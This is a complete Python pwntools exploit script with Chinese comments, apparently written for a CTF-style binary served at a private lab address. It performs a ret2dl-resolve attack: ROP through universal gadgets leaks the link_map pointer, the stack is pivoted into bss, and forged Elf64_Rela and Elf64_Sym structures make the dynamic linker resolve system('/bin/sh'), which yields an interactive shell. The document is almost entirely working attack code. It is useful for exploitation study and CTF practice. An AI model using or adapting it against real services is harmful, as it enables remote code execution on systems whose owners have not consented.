#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

universal_gadget1 = 0x4006aa	#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
universal_gadget2 = 0x400690	#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]

vulfun_addr = 0x4005e6
write_got = 0x600A58
read_got = 0x600A60
plt0_addr = 0x4004a0
link_map_got = 0x600A48
leave_ret = 0x400618
pop_rdi_ret = 0x4006b3
pop_rbp_ret = 0x400550
new_stack_addr = 0x600d88	#bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错
relplt_addr = 0x400420		#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf64_Rela偏移构造reloc_arg
dynsym_addr = 0x400280		#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf64_Sym结构体偏移构造Elf64_Rela.r_info
dynstr_addr = 0x400340		#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移构造Elf64_Sym.st_name

io = remote('172.17.0.3', 10001)

payload = ""
payload += 'A'*136						#padding
payload += p64(universal_gadget1)		#使用万能gadgets调用write泄露link_map地址
payload += p64(0x0)
payload += p64(0x1)						#rbp，随便设置
payload += p64(write_got)
payload += p64(0x8)
payload += p64(link_map_got)
payload += p64(0x1)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正
payload += p64(vulfun_addr)				#返回到vulnerable_function处

io.send(payload)					
io.recvuntil("Input:\n")
link_map_addr = u64(io.recv(8))
log.info("Leak link_map address:%#x" %(link_map_addr))

payload = ""
payload += 'A'*136						#padding
payload += p64(universal_gadget1)		#使用万能gadgets调用read向新栈中写入数据
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got)
payload += p64(0x500)
payload += p64(new_stack_addr)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正

payload += p64(pop_rbp_ret)				#返回到pop rbp; retn，劫持栈。此处直接劫持栈是因为如果继续修改link_map+0x1c8会导致ROP链过长，栈上的环境变量指针被破坏，从而导致system失败。
payload += p64(new_stack_addr)
payload += p64(leave_ret)

io.send(payload)						#输入向新栈写数据和栈劫持的payload

fake_Elf64_Rela_base_addr = new_stack_addr + 0x150	#新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐
fake_Elf64_Sym_base_addr = new_stack_addr + 0x190#新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠
fake_dynstr_addr = new_stack_addr + 0x1c0
#新栈上选择一块地址作为伪造的.dynstr函数名字符串system放置地址,与上一个结构体之间留出一段长度防止重叠
binsh_addr = new_stack_addr + 0x1c8	#"/bin/sh\x00"所在地址

rel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18	#计算两个结构体的对齐填充字节数，两个结构体大小都是0x18
rel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18

fake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align	#加上对齐值后为结构体真正地址
fake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align

fake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18	#计算伪造的reloc_arg

fake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 #伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7

fake_st_name = fake_dynstr_addr - dynstr_addr		#计算伪造的st_name数值为伪造函数字符串system与.dynstr节开头间的偏移

fake_Elf64_Rela_data = ""
fake_Elf64_Rela_data += p64(write_got)					#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误
fake_Elf64_Rela_data += p64(fake_r_info)
fake_Elf64_Rela_data += p64(0)

fake_Elf64_Sym_data = ""
fake_Elf64_Sym_data += p32(fake_st_name)
fake_Elf64_Sym_data += p32(0x12)							#后面的数据直接套用write函数的Elf64_Sym结构体，具体成员变量含义自行搜索，这里要注意数据大小
fake_Elf64_Sym_data += p64(0)
fake_Elf64_Sym_data += p64(0)

payload = ""
payload += "AAAAAAAA"
payload += p64(universal_gadget1)		#使用万能gadgets调用read把link_map+0x1c8置为0
payload += p64(0x0)	
payload += p64(0x1)						#rbp设置为1
payload += p64(read_got)			
payload += p64(0x8)
payload += p64(link_map_addr + 0x1c8)	
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正
			
payload += p64(pop_rdi_ret)			#为system函数设置参数"/bin/sh\x00"	
payload += p64(binsh_addr)			
payload += p64(plt0_addr)			
payload += p64(fake_reloc_arg)	
payload = payload.ljust(0x150, "A")	#padding

payload += 'A'*rel_plt_align
payload += fake_Elf64_Rela_data
payload = payload.ljust(0x190, "A")	#padding

payload += 'A'*rel_sym_align
payload += fake_Elf64_Sym_data
payload = payload.ljust(0x1c0, "A")	#padding
payload += "system\x00\x00"
payload += "/bin/sh\x00"

io.send(payload)					#上一段payload将数据读取到新栈，就是上面的payload，在此处写入
io.send(p64(0))						#payload中设置link_map+0x1c8为0，在此处写入

io.interactive()